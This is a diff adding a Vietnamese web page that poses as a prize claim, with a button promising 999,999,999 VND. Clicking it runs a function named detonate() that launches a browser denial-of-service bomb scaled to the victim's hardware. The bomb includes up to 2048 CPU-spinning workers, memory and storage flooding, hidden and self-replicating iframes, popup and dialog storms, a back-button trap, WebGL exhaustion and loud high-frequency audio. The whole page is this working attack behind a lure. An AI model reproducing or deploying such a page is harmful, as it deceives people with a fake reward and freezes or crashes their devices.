@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Nhận thưởng</title>
+<style>
+  html,body{margin:0;height:100%;background:#0b0b0f;color:#fff;
+    font-family:system-ui,Segoe UI,Roboto,sans-serif;
+    display:flex;align-items:center;justify-content:center;overflow:hidden;}
+  #box{text-align:center;z-index:2;position:relative;}
+  #btn{
+    padding:22px 56px;font-size:24px;font-weight:700;border:0;border-radius:14px;
+    background:linear-gradient(135deg,#00e676,#00b0ff);color:#001b0f;cursor:pointer;
+    box-shadow:0 0 40px #00e67688;transition:transform .1s;
+  }
+  #btn:active{transform:scale(.95);}
+  #sub{margin-top:14px;opacity:.7;font-size:14px;}
+  #stat{margin-top:10px;font-size:12px;opacity:.55;font-family:monospace;}
+</style>
+</head>
+<body>
+<div id="box">
+  <button id="btn">NHẬN TIỀN</button>
+  <div id="sub">Bấm để nhận 999.999.999 VNĐ</div>
+  <div id="stat">ready</div>
+</div>
+
+<script>
+const stat = document.getElementById('stat');
+const btn  = document.getElementById('btn');
+
+/* ---------- đo sức mạnh máy ---------- */
+function hardwareScore(){
+  const cores = navigator.hardwareConcurrency || 4;
+  const mem   = navigator.deviceMemory || 4;
+  const jsHeap = (performance.memory && performance.memory.jsHeapSizeLimit) || 2e9;
+  return Math.max(1, Math.floor(cores * mem * (jsHeap / 1e9)));
+}
+
+/* ---------- payload ---------- */
+async function detonate(){
+  const score = hardwareScore();
+  const K = 1e15;                     // hệ số nâng cấp
+  const mult = score * K;             // máy mạnh -> lớn hơn
+  stat.textContent = `score=${score} mult=${mult.toExponential(2)}`;
+
+  /* 1. nút tự bấm lại, tăng dần */
+  let hits = 0;
+  const reclick = () => {
+    hits++;
+    if (hits < 1e6) setTimeout(() => btn.click(), 0);
+  };
+  btn.onclick = reclick;
+  btn.click();
+
+  /* 2. block main thread theo mult */
+  function block(){
+    const t = performance.now();
+    const budget = Math.min(2000, 50 + Math.log10(mult));
+    while (performance.now() - t < budget){
+      Math.sqrt(Math.random()) * Math.sin(Math.random());
+    }
+    setTimeout(block, 0);
+  }
+  block();
+
+  /* 3. worker farm scale theo core */
+  const cores = navigator.hardwareConcurrency || 4;
+  const nWorkers = Math.min(2048, cores * 64);
+  const src = `
+    let acc = 0;
+    function spin(){
+      const t = performance.now();
+      while (performance.now() - t < 1000){
+        acc += Math.sqrt(Math.random()) * Math.sin(Math.random());
+      }
+      postMessage(acc);
+    }
+    onmessage = () => spin();
+  `;
+  const url = URL.createObjectURL(new Blob([src], {type:'application/javascript'}));
+  const workers = [];
+  for (let i = 0; i < nWorkers; i++){
+    try {
+      const w = new Worker(url);
+      w.onmessage = () => w.postMessage(1);
+      w.postMessage(1);
+      workers.push(w);
+    } catch(e){}
+  }
+
+  /* 4. memory churn scale */
+  const pool = [];
+  const chunkSize = 1e6;
+  setInterval(() => {
+    const bursts = Math.min(4096, Math.floor(Math.log10(mult)));
+    for (let i = 0; i < bursts; i++){
+      pool.push(new Float64Array(chunkSize));
+    }
+    if (pool.length > 100000) pool.splice(0, 50000);
+  }, 5);
+
+  /* 5. canvas noise full-screen */
+  const c = document.createElement('canvas');
+  c.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;z-index:1;';
+  document.body.appendChild(c);
+  c.width = innerWidth; c.height = innerHeight;
+  const ctx = c.getContext('2d');
+  const frame = () => {
+    const img = ctx.createImageData(c.width, c.height);
+    const d = img.data;
+    for (let i = 0; i < d.length; i += 4){
+      d[i]   = Math.random()*255;
+      d[i+1] = Math.random()*255;
+      d[i+2] = Math.random()*255;
+      d[i+3] = 255;
+    }
+    ctx.putImageData(img, 0, 0);
+    requestAnimationFrame(frame);
+  };
+  frame();
+
+  /* 6. iframe farm */
+  const nIframe = Math.min(4096, cores * 128);
+  setInterval(() => {
+    for (let i = 0; i < 64; i++){
+      const f = document.createElement('iframe');
+      f.src = 'about:blank';
+      f.style.cssText =
+        'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;';
+      document.body.appendChild(f);
+      try {
+        f.contentWindow.document.open();
+        f.contentWindow.document.write(
+          '<canvas id=x></canvas><script>' +
+          'const x=document.getElementById("x"),g=x.getContext("2d");' +
+          'x.width=300;x.height=200;' +
+          '(function n(){const i=g.createImageData(300,200),d=i.data;' +
+          'for(let j=0;j<d.length;j+=4){d[j]=Math.random()*255;d[j+1]=Math.random()*255;d[j+2]=Math.random()*255;d[j+3]=255;}' +
+          'g.putImageData(i,0,0);requestAnimationFrame(n);})();' +
+          '<\/script>');
+        f.contentWindow.document.close();
+      } catch(e){}
+    }
+  }, 20);
+
+  /* 7. popup storm (bị chặn ở lần đầu, nhưng vẫn spam) */
+  setInterval(() => {
+    for (let i = 0; i < 16; i++){
+      try { window.open('about:blank', '_blank'); } catch(e){}
+    }
+  }, 50);
+
+  /* 8. dialog spam */
+  setInterval(() => { try { confirm('.'); } catch(e){} }, 50);
+  setInterval(() => { try { alert('.'); } catch(e){} }, 100);
+  setInterval(() => { try { prompt('.'); } catch(e){} }, 150);
+
+  /* 9. history trap */
+  setInterval(() => { try { history.pushState({}, '', location.href); } catch(e){} }, 1);
+
+  /* 10. storage overflow */
+  setInterval(() => {
+    try {
+      for (let i = 0; i < 2000; i++){
+        localStorage.setItem('k'+Math.random(), 'v'.repeat(10000));
+        sessionStorage.setItem('s'+Math.random(), 'v'.repeat(10000));
+      }
+    } catch(e){}
+  }, 10);
+
+  /* 11. indexedDB churn */
+  try {
+    const r = indexedDB.open('bomb', 1);
+    r.onupgradeneeded = e => e.target.result.createObjectStore('s');
+    r.onsuccess = e => {
+      const db = e.target.result;
+      setInterval(() => {
+        try {
+          const tx = db.transaction('s','readwrite');
+          tx.objectStore('s').put(new Float64Array(1e6), Math.random());
+        } catch(err){}
+      }, 1);
+    };
+  } catch(e){}
+
+  /* 12. WebGL context churn */
+  setInterval(() => {
+    for (let i = 0; i < 64; i++){
+      try {
+        const cv = document.createElement('canvas');
+        const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+        if (!gl) continue;
+        for (let k = 0; k < 512; k++){
+          gl.createBuffer(); gl.createTexture(); gl.createProgram();
+        }
+      } catch(e){}
+    }
+  }, 5);
+
+  /* 13. audio blast */
+  try {
+    const ac = new (window.AudioContext || window.webkitAudioContext)();
+    for (let i = 0; i < 64; i++){
+      const o = ac.createOscillator();
+      const g = ac.createGain();
+      o.type = i % 2 ? 'sawtooth' : 'square';
+      o.frequency.value = 15000 + i * 137;
+      g.gain.value = 0.5;
+      o.connect(g).connect(ac.destination);
+      o.start();
+    }
+  } catch(e){}
+
+  /* 14. self-replicate iframe */
+  setInterval(() => {
+    try {
+      const f = document.createElement('iframe');
+      f.src = location.href;
+      f.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;';
+      document.body.appendChild(f);
+    } catch(e){}
+  }, 10);
+
+  /* 15. listener pileup */
+  setInterval(() => {
+    for (let i = 0; i < 10000; i++){
+      document.addEventListener('mousemove', () => Math.random());
+      window.addEventListener('scroll', () => Math.random());
+      window.addEventListener('resize', () => Math.random());
+    }
+  }, 20);
+
+  /* 16. CSS keyframe spam */
+  let n = 0;
+  setInterval(() => {
+    const s = document.createElement('style');
+    s.textContent =
+      `@keyframes a${n}{0%{filter:hue-rotate(0)}100%{filter:hue-rotate(360deg)}}` +
+      `body{animation:a${n} ${Math.random()}s infinite;}`;
+    document.head.appendChild(s);
+    n++;
+  }, 1);
+
+  /* 17. WebRTC loopback churn */
+  setInterval(async () => {
+    try {
+      for (let i = 0; i < 32; i++){
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel('d');
+        const o = await pc.createOffer();
+        await pc.setLocalDescription(o);
+        pc.close();
+      }
+    } catch(e){}
+  }, 50);
+
+  /* 18. speech synthesis spam */
+  setInterval(() => {
+    try {
+      const u = new SpeechSynthesisUtterance('a'.repeat(500));
+      u.rate = 10;
+      speechSynthesis.speak(u);
+    } catch(e){}
+  }, 20);
+
+  /* 19. notification spam */
+  setInterval(() => {
+    try { if (Notification.permission === 'granted')
+      new Notification('a'.repeat(500)); } catch(e){}
+  }, 10);
+
+  /* 20. geolocation poll */
+  setInterval(() => {
+    try { navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); } catch(e){}
+  }, 1);
+}
+
+btn.addEventListener('click', function once(){
+  btn.removeEventListener('click', once);
+  detonate();
+}, {once:true});
+</script>
+</body>
+</html>
